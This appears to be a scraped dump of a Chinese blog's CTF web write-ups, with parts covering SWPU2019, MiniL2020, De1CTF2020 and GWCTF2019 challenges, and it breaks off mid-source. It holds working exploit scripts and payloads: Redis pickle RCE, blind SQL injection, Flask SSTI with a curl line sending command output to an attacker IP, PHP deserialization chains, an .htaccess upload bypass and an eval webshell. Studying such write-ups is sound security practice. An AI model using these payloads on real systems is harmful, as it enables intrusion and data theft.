shadowsocks\r连接代理 sslocal -s node3.buuoj.cn -p 11111 -k 123456\r报错：AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup\n报错参考：https://www.jianshu.com/p/3f874d5aac54\n在Python2.7中的openssl文件中,下面这个函数没有定义,具体就是这个:\nEVP_CIPHER_CTX_cleanup\r更深层的是是由于在openssl1.1.0版本中，废弃了 EVP_CIPHER_CTX_cleanup 函数,要用这个函数 EVP_CIPHER_CTX_reset() 代替;\n直接 vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py 打开文件，全局搜索关键字替换即可；\nkali下编译安装proxychains4 编译安装 git clone https://github.com/rofl0r/proxychains-ng.git # download\rcd proxychains-ng\r./configure\rsudo make sudo make install\rcp ./src/proxychains.conf /etc/proxychains.conf # config file\r用proxychains做正向代理 vim /etc/proxychains.conf\r添加一行：socks5 127.0.0.1 1080（具体取决于你的ss配置的端口）\n不过我这里需要注释掉原来的那一行 socks4 127.0.0.1 9050\n命令行访问内网 proxychains4 ping web 只需在前面加 proxychains4 就行了\n浏览器访问内网 浏览器配置浏览器代理，选择Sock5，ip设为127.0.0.1，端口设为默认的1080。\n然后我们用浏览器访问http://web:2333/，注册登录之后在源码里面发现 redis 字样提示，得知是redis，用命令行访问\nproxychains4 redis-cli -h web -p 6379\n发现执行命令需要密码，我们用msf的模块爆破之：\nsudo proxychains4 msfconsole\rsearch redis\ruse auxiliary/scanner/redis/redis_login\rset rhosts web\rset rport 6379\rexploit\r得到密码：password\n于是可以查看数据：\n我看到了自己的session，发现是python序列化之后的数据，我们访问的时候他会对这个数据进行反序列化 如果我们控制了这个数据，那么可以利用反序列化来进行getshell 对python不是很熟悉，网上找到exp改一改：\n#!/usr/bin/env python\rimport cPickle\rimport os\rimport redis\rclass exp(object):\rdef __reduce__(self):\rs = \"ls / \u003e ./static/js/materialize.min.js\"\r#执行命令，外带到一个js文件，弹shell是不可以的，BUU内网都不可以，折腾了好久\rreturn (os.system, (s,))\re = exp()\rs = cPickle.dumps(e)\rr = redis.Redis(host='web',password=\"password\", port=6379, db=0)\rr.set(\"session:1ea713bb-ad84-489b-b48b-1ba3f07b7ecb\", s)#这里需要改为自己的session\r运行 proxychains4 python exp.py 命令之后，我们可以在redis的终端看到我们的session 已经被改为我们恶意的序列化结果了，再次访问http://web:2333/输入用户名密码登陆后 就可以在/static/js/materialize.min.js文件中看到我们命令执行结果：\nflag{b13534e2-8984-4f59-a46f-1f8eac316899}\nweb3 考点：flask session伪造，软连接读取flag，命令注入\n请见BUU刷题记录3\nweb4 考点：PDO场景下的堆叠注入、时间盲注\n打开题目叫你登录，不过任凭你怎么登录都会没有反应，注册说“未开放注册功能”\n回头一抓包，发现我们向 /index.php?r=Login/Login 发送了一个数据包，这里可以注入，POST输入：\n{\"username\":\"1'\",\"password\":\"123\"}\r页面会报错，但是我们输入：\n{\"username\":\"1';\",\"password\":\"123\"}\r页面却没报错，同时说密码错误；\n那么说明这道题可以堆叠注入。\n尝试 1';show databases; 之类的操作，一直显示密码错误，猜测可能关键字被waf了，因为是堆叠，我们可以参考新春战疫的一道堆叠注入（当时也是PDO），使用预编译+16进制编码绕过waf。\n而且页面不会根据我们输入情况回显不同，那么就用时间盲注；\nexp：\n# by wh1sper\r# 时间盲注\rimport requests\rimport time\rhost = 'http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef char_to_hex(str):\rres = ''\rfor i in str:\rres += hex(ord(i))\rres = '0x' + res.replace('0x', '')\rreturn res\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = 'database()'#---\u003ectf\r#babyselect = '(select group_concat(table_name) ' \\\r# 'from information_schema.tables where table_schema=database())'#---flag\r# babyselect = '(select group_concat(column_name) ' \\\r# 'from information_schema.columns where table_name='flag')'#---\u003eflag\rbabyselect = '(select flag from flag)'#---\u003eglzjin_wants_a_girl_friend.zip\rselect = \"select if((ascii(substr(\" +babyselect+ \",{},1))\u003e {}),sleep(3),1);\"\\\r.format(j, mid(bot, top))\rplayload = \"1';set @a=\"+ char_to_hex(select) +\";PREPARE test from @a;execute test;\"\rdata = {\r\"username\": playload,\r\"password\": \"1\"\r}\rprint(mid(bot, top))\rstart_time = time.time()\rr = requests.post(url=host, json=data)\rend_tmie = time.time()\r#print(r.text)\rif end_tmie - start_time \u003e 1.5: # 成功\rif top - 1 == bot: # top和bot相邻，说明name是top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # 成功就上移bot\relse: # 失败\rif top - 1 == bot: # top和bot相邻，加上失败，说明name是bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # 失败就下移top\rif __name__ == '__main__':\rsqli()\r得到：glzjin_wants_a_girl_friend.zip\n然后看的出来是个文件，访问下载之，得到网站源码。 很明显，我们要通过某种方法将flag.php中的文件内容给读取出来。\n这是个MVC模型，首先了解一下该框架下url的解析过程：\n 从r参数中获取要访问的 Controller 以及 Action ,然后以 / 分隔开后拼接成完整的控制器名。 以 Login/Index 为例，就是将 Login/Index 分隔开分别拼接成 LoginController 以及 actionIndex ,然后调用 LoginController 这个类中的 actionIndex 方法。每个 action 里面会调用对应的 loadView() 方法进行模版渲染，然后将页面返回给客户端。 若访问的 Controller 不存在则默认解析 Login/Index 。  这样我们就应该先来审计控制器的代码。\n不难发现，在BaseController中有着这么一段明显有问题的代码\npublic function loadView($viewName ='', $viewData = [])\r{\r$this-\u003eviewPath = BASE_PATH . \"/View/{$viewName}.php\";\rif(file_exists($this-\u003eviewPath))\r{\rextract($viewData);\rinclude $this-\u003eviewPath;\r}\r}\r这段代码中使用了 extract() ，以及包含了 /View/{$viewName}.php ，也就是说我们能通过 $viewName 和 $viewData 这两个变量来更改 /View 下任何一个php文件的任何一个变量的值。\n在UserController中找到了以下代码:\npublic function actionIndex()\r{\r$listData = $_REQUEST;\r$this-\u003eloadView('userIndex',$listData);\r}\r可以看出来，其中 $listData 是从请求中获取，用户可控，而其对应的 /View/userIndex.php 中存在一个文件读取：\n\u003cdiv class=\"fakeimg\"\u003e\u003c?php\rif(!isset($img_file)) {\r$img_file = '/../favicon.ico';\r}\r$img_dir = dirname(__FILE__) . $img_file;\r$img_base64 = imgToBase64($img_dir);\recho '\u003cimg src=\"' . $img_base64 . '\"\u003e'; //图片形式展示\r?\u003e\u003c/div\u003e\r其中 imgToBase64() 实现的是将目标文件转化成base64格式。而我们只需要将 $img_file 改成 /flag.php 即可。\n访问 http://ip/index.php?r=User/Index\u0026img_file=/../flag.php 即可获得flag的base64\nflag{fd2a64c6-8bd5-48c8-8ed7-8b5974dfaddf}\n","description":"","tags":["python反序列化","Redis","堆叠注入","flask"],"title":"SWPU2019 复现","uri":"/posts/swpu2019-%E5%A4%8D%E7%8E%B0/"},{"categories":["ctf_writeup"],"content":"西电校赛，难度适中，本人内鬼选手，看了下题。\n id_wife 考点：堆叠注入\n不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生\n测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭\nfrank');handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#\rminil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}\nPersonal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。\n学习链接\n\u003e\u003eflag0师傅\n\u003e\u003ebyc_404师傅\n打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI\n输入 {{2+2}} 之后回显的 4 实锤。\nFuzz，过滤了下划线、单双引号、没有过滤中括号\n最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出\n在class中寻找模块exp：\n#python 3\rimport re\rstr = '''\r（回显信息）\r'''\rlist = re.split(',', str)\rfor i in range(0, len(list)):\rif 'catch_warnings' in list[i]:\rprint(i)\rbreak\rplayload：\n?x1=__class__\u0026x2=__base__\u0026x3=__subclasses__\u0026x4=__getitem__\u0026x5=__init__\r\u0026x6=__globals__\u0026x7=__builtins__\u0026x8=eval\u0026x9=__import__(\"os\").popen('cat+/flag').read()\rX-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()\r|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)\r|attr(request.args.x4)(request.args.x8)(request.args.x9)}}\r复现时补充：\n我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：\nXFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}\r//回显：Your IP: \u003cclass 'os._wrap_close'\u003e\rGET ：?class=__class__\u0026mro=__mro__\u0026subclasses=__subclasses__\u0026init=__init__\u0026globals=__globals\r__\u0026builtins=__builtins__\u0026eval=eval\u0026cmd=__import__(\"os\").popen(\"cat+/flag\").read()\rx-forwarded-for: {{ [][request.args.class][request.args.mro][1][request.args.subclasses]()\r[127][request.args.init][request.args.globals][request.args.builtins][request.args.eval]\r(request.args.cmd) }}\rezbypass 考察：过滤逗号等号的无列名注入，PHP反序列化字符逃逸\n这道题两个步骤，第一层是sqli，第二层是反序列化字符串逃逸\n第一层我做的非预期，fuzz过后，发现ban了逗号、等号、or\n然后发现是双引号闭合\nlogname=1\"||1 limit 1 offset 3#\u0026logpass=1\r回显：alert('Username:Flag_1s_heRe \\nPassword:goto /flag327a6c4304a')\r访问 ip/flag327a6c4304a/ ，来到第二关：\n\u003c?php\rinclude ('flag.php');\rerror_reporting(0);\rfunction filter($payload){\r$key = array('php','flag','xdsec');\r$filter = '/'.implode('|',$key).'/i';\rreturn preg_replace($filter,'hack!!!!',$payload);\r}\r$payload=$_GET['payload'];\r$fuck['mini']='nb666';\r$fuck['V0n']='no_girlfriend';\rif(isset($payload)) {\rif (strpos($payload, 'php') \u003e=0 || strpos($payload, 'flag')\u003e=0 || strpos($payload, 'xdsec')\u003e=0) {\r$fuck['mini']=$payload;\rvar_dump(filter(serialize($fuck)));\r$fuck=unserialize(filter(serialize($fuck)));\rvar_dump($fuck);\rif ($fuck['V0n'] === 'has_girlfriend') {\recho $flag;\r} else {\recho 'fuck_no_girlfriend!!!';\r}\r}else{\recho 'fuck_no_key!!!';\r}\r}else{\rhighlight_file(__FILE__);\r}\r题目会把序列化之后的 php flag xdsec 关键字替换为 hack!!!! 然后进行反序列化操作再赋值给 $fuck 我就直接想到了安恒2020.4月赛的web1，越看越像字符逃逸，不过有区别的是这里是字符变多导致后面的逃逸，不过思路一样：逃逸、闭合\n我们的 php 关键字被替换为 hack!!!! 之后，从3个字符变成了5个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，我们可以看到下图替换之后由于左边选中部分不一致，造成了反序列化后出现 bool(false) 的结果\n直接看payload就懂：\n?payload=phpphpphpphpphpphpphp\";s:3:\"V0n\";s:14:\"has_girlfriend\";}\r我们输入了56了字符， phpphpphpphpphpphpphp 被替换之后正好是56个字符，我们后面的字符就逃逸了，这个时候给他一闭和，flag就来了\nminil{7f3ea366-f5ab-463c-b511-af63d6dc7715}\nLet's_Play_Dolls 考点：PHP无参数RCE、pop链\n开题送码：\n \u003c?php\rerror_reporting(0);\rif(isset($_GET['a'])){\runserialize($_GET['a']);\r}\relse{\rhighlight_file(__FILE__);\r}\rclass foo1{\rpublic $var='';\rfunction __construct(){\r$this-\u003evar='phpinfo();';\r}\rfunction execute(){\rif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $this-\u003evar)) { if(!preg_match('/header|bin|hex|oct|dec|na|eval|exec|system|pass/i',$this-\u003evar)){\reval($this-\u003evar);\r} else{\rdie(\"hacked!\");\r} }\r}\rfunction __wakeup(){\r$this-\u003evar=\"phpinfo();\";\r}\rfunction __desctuct(){\recho '\u003cbr\u003edesctuct foo1\u003c/br\u003e';\r}\r}\rclass foo2{\rpublic $var;\rpublic $obj;\rfunction __construct(){\r$this-\u003evar='hi';\r$this-\u003eobj=null;\r}\rfunction __toString(){\r$this-\u003eobj-\u003eexecute();\rreturn $this-\u003evar;\r}\rfunction __desctuct(){\recho '\u003cbr\u003edesctuct foo2\u003c/br\u003e';\r}\r}\rclass foo3{\rpublic $var;\rfunction __construct(){\r$this-\u003evar=\"index.php\";\r}\rfunction __destruct(){\rif(file_exists($this-\u003evar)){\recho \"\u003cbr\u003e\".$this-\u003evar.\"exist\u003c/br\u003e\";\r}\recho \"\u003cbr\u003edesctuct foo3\u003c/br\u003e\";\r}\rfunction execute(){\rprint(\"hi\");\r}\r}\r大概是这样：\n$pop = new foo3;\r$pop-\u003evar = new foo2;//触发__toString()，调用execute()\r$pop-\u003evar-\u003eobj = new foo1;//调用foo1的execute()\r成功调用foo1的execute()函数之后就需要我们绕正则，这里是无参数RCE， if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $this-\u003evar)) 限制了参数；\n查了一下?R，PHP manual中这样说：\n ”首先，它匹配一个左括号。 然后它匹配任意数量的非括号字符序列或一个模式自身的递归匹配(比如， 一个正确的括号子串)，最终，匹配一个右括号。“  大概是这个样子 XXXX(XXXX(XXXX()))\n\\W等价于[^A-Za-z0-9_]\r+括号匹配\\( ...... \\)\r+括号中间是XXXX(XXXX(XXXX()))\r意思是我们可以 a(); a(a()); 但是不能 a('1'); 。\n需要我们进行不带参数的RCE，这里王叹之师傅讲的很好，基本就是那几个函数换着用，这里直接上playload；\n把foo1的var属性改为：\nprint_r(array_reverse(scandir(current(localeconv()))));\r返回值：\rArray ( [0] =\u003e youCanGet1tmaybe [1] =\u003e index.php [2] =\u003e .. [3] =\u003e . )\rprint_r(scandir(next(scandir(current(localeconv())))));\r返回值：\rArray ( [0] =\u003e . [1] =\u003e .. [2] =\u003e html ) 发现不是在上级目录，应该是读取youCanGet1tmaybe文件\rprint_r(readfile(end(scandir(current(localeconv())))));\r返回值：\rminil{af22c569-6114-44c6-8c8c-4b561cf7ac7b}\r注意： echo serialize($pop)之后，需要绕过 __wakeup() 才行。\nare you reclu3e? 考点：vim文件恢复、宽字节注入、反序列化\n其实宽字节一开始就测出来了。。。 只不过我以为是要到表里面去注什么东西，结果是只需要登陆就可以。。。\n根据放出的hint，提示vim，马上想到.swp文件，login和index的全部整下来恢复\n在login.php中发现GBK字样，实锤宽字节注入：\nusername=reclu3e%df' union select 1,1#\u0026password=1\r登录之后我们就有了session，可以GET传入p让他反序列化\n根据网鼎的web1，PHP7.1+的版本，反序列化的时候不会对属性类型进⾏特别的处理\n所以我们可以直接把他改成public来打：\n\u003c?php\rinclude \"flag.php\";//$flag=\"minilctf{****}\";\rsession_start();\rif (empty($_SESSION['uid'])) {\rinclude \"loginForm.html\";\r}\relse{\recho '\u003ch1\u003eHello, reclu3e!\u003c/h1\u003e';\r$p=unserialize(isset($_GET[\"p\"])?$_GET[\"p\"]:\"\");\r}\r?\u003e\r\u003c?php\rclass person{\rpublic $name='';\rpublic $age=0;\rpublic $weight=0;\rpublic $height=0;\rpublic $serialize='\";phpinfo();$s=\"';\rpublic function __wakeup(){\rif(is_numeric($this-\u003eserialize)){\r$this-\u003eserialize++;\r}\r}\rpublic function __destruct(){\r@eval('$s=\"'.$this-\u003eserialize.'\";');\r}\r}\r$p = new person();\recho serialize($p);\r//O:6:\"person\":5:{s:4:\"name\";s:0:\"\";s:3:\"age\";i:0;s:6:\"weight\";\ri:0;s:6:\"height\";i:0;s:9:\"serialize\";s:16:\"\";phpinfo();$s=\"\";}\rflag就在PHPINFO里面\n其实这是一道简单题，之前我就测出来宽字节，不过应该是information_schema里面的列名被删了， 我以为是要注密码来登录，结果没想到。。然后反序列化也简单，至于后来给了hint之后解出仍然这 么少，可能就是本题的槽点之一。\nminil{22dac17a-b2e6-41c7-b969-5b1687fc73e1}\np 考点：反序列化、RCE绕过\n听说和CTFshow的红包题第二弹几乎差不多，当时没做，不过我看了wp之后发现我的操作几乎 一毛一样，不知道为什么没出。日后来填坑\nmd，不知道为啥，之前我自己构造了一个文件上传表单，然后用bp的intruder发包，费力不讨好，死活弄不出来。\n后来看了@blackwatch师傅的wp之后，直接起一个几行代码的python就可以的。。。。\n被自己菜哭，不多BB，exp：\nimport requests\rimport base64\rurl = 'http://2c0b5cfcdee39a9fb6e7f5789943ca90.challenge.mini.lctf.online:1080/'\rgit = 'O:6:\"github\":2:{s:3:\"cmd\";s:26:\"?\u003e\u003c?=`. /??p/p?p??????`;?\u003e\";}'\rgit = base64.b64encode(git.encode()).decode()\rcookies = {'git': git}\rfiles = {'file': '#!/bin/sh\\ncat /* | grep \"minil\"\\n'}\ra = requests.post(url, files=files, cookies=cookies)\rprint(a.text)\rminil{7da6b052-6630-40d8-9e7a-ccd5ff098871}\ninclude 考点：PHP语言逻辑、WebDav协议绕过RFI限制\n不想做。。日后填坑\n","description":"西电校赛","tags":["堆叠注入","SSTI","PHP反序列化","无参数RCE","RCE bypass","WebDav"],"title":"MiniL2020_web_wp","uri":"/posts/minil2020_web_wp/"},{"categories":["ctf_writeup"],"content":"本次De1CTF是XCTF的第一场分站赛，不但吸引了国内许许多多的战队，还有非常多的国外的战队，据说前26名一半都是国外的。当然比赛题目也是非常的难，感觉自己在这种大比赛上面还是不能发挥什么作用。\n check in 打开就是一个经典的文件上传页面，上传一个普通的图片马，页面回显：\nperl|pyth|ph|auto|curl|base|\u003e|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!\r文件内容被ban了这些，\n随后尝试了一些文件名称，只要文件名带ph、html、.user.ini之类的都会直接返回filename error\n不过这么多东西都被ban了，唯独 .htaccess 没有被ban。\n不过这个我开局就尝试了，但是没有发现什么姿势。\n关于 .htaccess 几种姿势：  将特定文件作为php解析，用作后门。 PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门（对于CGI/FastCGI模式 PHP 5.3.0 以上版本，还可以使用 在目录下创建.user.ini文件 。来引入该参数） CGI启动方式的RCE利用姿势 FastCGI启动方式的RCE利用姿势 重定向  这道题ban掉了ph关键字之后，（1）中的方法看似不可以用，实则另有玄机。\n在XNUCA2019中，一道web题目ezphp的非预期解中，利用到了 \\ 拼接 .htaccess 文件中换行的内容，当时一种是为了利用第一行的 # 符号拼接第二行的垃圾数据来达到注释垃圾数据的目的，另一种也是 \\ 拼接绕过关键字过滤。具体可以参看XNUCA2019 ez系列web题解和X-NUCA 2019 Web WP\n文件名 .htaccess，MIME改成 image/jpg ，文件内容：\nAddType application/x-httpd-p\\\rhp .jpg\r那么我们通过\\来拼接绕过了ph关键字之后，我们可以发现我们上传的jpg文件不再是无法查看的情况：\n第二个点，PHPecho短标签。\n过滤了 \u003e 和 ph 的情况下， \u003c?php ?\u003e 和 \u003cscript\u003e 这种被通杀了，参考网上的一篇文章：\nPHP 的四种标签写法 \u003c?php echo 1; ?\u003e //正常写法\r\u003c? echo 1; ?\u003e //短标签写法，5.4 起 \u003c?= 'hello'; === \u003c? echo 'hello';\r\u003c% echo 1; %\u003e //asp 风格写法\r\u003cscript language=\"php\"\u003e echo 1; \u003c/script\u003e //长标签写法\r不同版本的区别\n第 1 种是正常写法，没什么可说的。\n第 2 种，需要 php.ini 配置文件中的指令 short_open_tag 打开后才可用，或者在 PHP 编译时加入了 --enable-short-tags 选项。自 PHP5.4 起，短格式的 echo 标记 \u003c?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。\n第 3 种，不推荐写法，为了 asp 程序员学习 php 所添加的语法糖写法。需要通过 php.ini 配置文件中的指令 asp_tags 打开后才可用。\n第 4 种，在 php7.0 后已经不解析了。\n那就直接ojbk：\nDe1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}\n","description":"","tags":["文件上传"],"title":"De1CTF2020_check in","uri":"/posts/de1ctf2020_check-in/"},{"categories":["ctf_writeup"],"content":"之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现\n 你的名字 考点：flaskSSTI、绕过{{}}过滤、黑名单过滤逻辑错误\n很详细的SSTI\u003e\u003e：https://xz.aliyun.com/t/6885#toc-4\nSSTIbypass姿势\u003e\u003ehttps://p0sec.net/index.php/archives/120/\n参考：\u003e\u003eggb0n\n打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。\n尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting '{' in \\var\\WWW\\html\\test.php on line 13 ”\n不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；\n但是可以通过 {%%} 类似的方式来进行注入，尝试 {%if 1%}1{% endif%} ，发现服务器直接给出500错误。。。判断可能有什么过滤\n直接输入if，返回结果是：\nhello !\r说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。\n参考了师傅写的wp，fuzz出来的过滤可能是这个样子：\nblacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',\r'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',\r'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']\rfor no in blacklist:\rwhile True:\rif no in s:\rs = s.replace(no, '')\relse:\rbreak\rreturn s\r考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 if=\u003eiconfigf ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 config 被替换之后，过滤也就结束了。\n那么我们在所有被过滤的关键词中间都可以插入一个config来避开过滤；\n最终playlaod：\n{% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`ls \\|base64`') %}1{% endiconfigf %}\r#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机\rflag{a2bc941d-a38d-42bb-97be-fe2440442cdf}\n枯燥的抽奖 考点：PHP逆向脚本、PHP伪随机数爆破\n打开题目，叫你猜数据，并且给了前10位：\n随便输一个提交，随即给出源码：\n\u003c?php\r#这不是抽奖程序的源代码！不许看！\rheader(\"Content-Type: text/html;charset=utf-8\");\rsession_start();\rif(!isset($_SESSION['seed'])){\r$_SESSION['seed']=rand(0,999999999);\r}\rmt_srand($_SESSION['seed']);\r$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\r$str='';\r$len1=20;\rfor ( $i = 0; $i \u003c $len1; $i++ ){\r$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }\r$str_show = substr($str, 0, 10);\recho \"\u003cp id='p1'\u003e\".$str_show.\"\u003c/p\u003e\";\rif(isset($_POST['num'])){\rif($_POST['num']===$str){x\recho \"\u003cp id=flag\u003e抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}\u003c/p\u003e\";\r}\relse{\recho \"\u003cp id=flag\u003e没抽中哦，再试试吧\u003c/p\u003e\";\r}\r}\rshow_source(\"check.php\");\r意思大概是：\n一个20次的循环，每次从 $str_long1 随机取一个字符，拼接成最后的 $str 。\n 当 mt_rand() 函数运行的时候，会检查有没有播种 mt_srand 如果已经播种了，就直接取随机数，其实这里和C语言一样（PHP底层是C）如果不每次重新播种的话，随机数怎么取都是一样的  我们来写段代码。\n\u003c?php\rmt_srand(12345);\recho mt_rand().\"\u003cbr/\u003e\";\r?\u003e\r我们访问，输出 162946439 。\n现在代码改为\n\u003c?php mt_srand(12345); echo mt_rand().\"\u003cbr/\u003e\";\recho mt_rand().\"\u003cbr/\u003e\";\recho mt_rand().\"\u003cbr/\u003e\";\recho mt_rand().\"\u003cbr/\u003e\";\recho mt_rand().\"\u003cbr/\u003e\";\r?\u003e\r我们再次访问:\n162946439\r247161732\r1463094264\r1878061366\r394962642\r现在细心的人可能已经发现，第一个数 162946439 存在猫腻了。\n为什么生成随机数会一样呢？我们多次访问。震惊: 还是\n162946439\r247161732\r1463094264\r1878061366\r394962642\r其实，这就是伪随机数的漏洞，存在可预测性。\n生成伪随机数是线性的，你可以理解为 y=ax , x 就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数)了吗 当然，实际上更复杂肯定。\n我知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。\n用到的是爆破，已经有写好的C脚本了。\n我们的思路就是根据他给出的10为数据，来爆破他的随机数种子，然后在把剩下的随机数输出\n因为是用的php_mt_seed，我们要用他的格式，这是转换成随机数的脚本\n\u003c?php\r$pass_now = \"JAfq968Gqy\";//给出的密钥\r$allowable_characters = '\rabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';//字母表\r$length = strlen($allowable_characters) - 1;\rfor ($j = 0; $j \u003c strlen($pass_now); $j++) {//遍历密钥\rfor ($i = 0; $i \u003c $length; $i++) {//遍历字母表\rif ($pass_now[$j] == $allowable_characters[$i]) {\recho \"$i $i 0 $length \";\rbreak;\r}\r}\r}\r?\u003e\r运行，得到\n45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61\r把php_mt_seed下载解压之后，运行命令：\nmake\r./php_mt_seed 45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61\r可以得到他的随机数种子\n然后我们直接把他原来的代码拷贝过来，种子替换为我们爆破出来的：\n\u003c?php\rmt_srand(591614089);\r$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\r$str='';\r$len1=20;\rfor ( $i = 0; $i \u003c $len1; $i++ ){\r$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }\r$str_show = substr($str, 0, 20);\recho $str_show;\r?\u003e\r运行得到一串字符 JAfq968GqyhRKQTHLc8j ，开头恰巧就是他给的，提交获得flag\nflag{37c86593-2593-4566-b3cd-18081cbe44d0}\n","description":"广东外语外贸大学主办的比赛","tags":["SSTI","伪随机数"],"title":"GWCTF 2019 复现","uri":"/posts/gwctf-2019-%E5%A4%8D%E7%8E%B0/"},{"categories":["ctf_writeup"],"content":"查源码 F12，ctrl+U，没啥好说的\nRealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：\n \u003c?php\r#error_reporting(0);\rclass HelloPhp\r{\rpublic $a;\rpublic $b;\rpublic function __construct(){\r$this-\u003ea = \"Y-m-d h:i:s\";\r$this-\u003eb = \"date\";\r}\rpublic function __destruct(){\r$a = $this-\u003ea;\r$b = $this-\u003eb;\recho $b($a);\r}\r}\r$c = new HelloPhp;\rif(isset($_GET['source']))\r{\rhighlight_file(__FILE__);\rdie(0);\r}\r@$ppp = unserialize($_GET[\"data\"]);\r2020-04-21 07:53:29\r很简单的一个反序列化，\n\u003c?php\r#error_reporting(0);\rclass HelloPhp\r{\rpublic $a = '1';//更改为2，3，4，5能读取更多信息\rpublic $b = 'phpinfo';\r/*\rpublic function __destruct(){\r$a = $this-\u003ea;\r$b = $this-\u003eb;\recho $b($a);\r}\r*/\r}\r$pop = new HelloPhp;\recho serialize($pop);\r直接 ?data=O:8:\"HelloPhp\":2:{s:1:\"a\";s:1:\"1\";s:1:\"b\";s:7:\"phpinfo\";} 就能看到phpinfo页面；\n好，写后门：\n\u003c?php\r#error_reporting(0);\rclass HelloPhp\r{\rpublic $a = 'eval($_POST[\\'wh1sper\\']);';\rpublic $b = 'assert';\r/*\rpublic function __destruct(){\r$a = $this-\u003ea;\r$b = $this-\u003eb;\recho $b($a);\r}\r*/\r}\r$pop = new HelloPhp;\recho serialize($pop);\rO:8:\"HelloPhp\":2:{s:1:\"a\";s:24:\"eval($_POST['wh1sper']);\";s:1:\"b\";s:6:\"assert\";}\n蚁剑访问 ?data=O:8:\"HelloPhp\":2:{s:1:\"a\";s:24:\"eval($_POST['wh1sper']);\";s:1:\"b\";s:6:\"assert\";} 密码wh1sper就能拿到shell，不过在phpinfo里面可以看到禁用了很多函数，这里可以使用蚁剑的插件绕过：\n直接美滋滋；\n不过根目录是假flag，flag就在phpinfo页面。。。。。\nflag{6b8ca41f-d409-4d39-b62f-5243d2f0d64b}\n我还去探测内网，真的搞心态。。。\nweb🐕 考察密码学，详见本站：Padding Oracle Attack\u0026CBC字节翻转攻击\n验证🐎 参考：https://guokeya.github.io/post/XxOKeal9U/\n考点：JS弱类型转换，JS原型链\n源码：\nconst express = require('express');\rconst bodyParser = require('body-parser');\rconst cookieSession = require('cookie-session');\rconst fs = require('fs');\rconst crypto = require('crypto');\rconst keys = require('./key.js').keys;\rfunction md5(s) {\rreturn crypto.createHash('md5')\r.update(s)\r.digest('hex');\r}\rfunction saferEval(str) {\rif (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/\u0026|^%\u003c\u003e=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\rreturn null;\r}\rreturn eval(str);\r} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个\rconst template = fs.readFileSync('./index.html').toString();\rfunction render(results) {\rreturn template.replace('{{results}}', results.join('\u003cbr/\u003e'));\r}\rconst app = express();\rapp.use(bodyParser.urlencoded({ extended: false }));\rapp.use(bodyParser.json());\rapp.use(cookieSession({\rname: 'PHPSESSION', // 2020.3/WORKER2 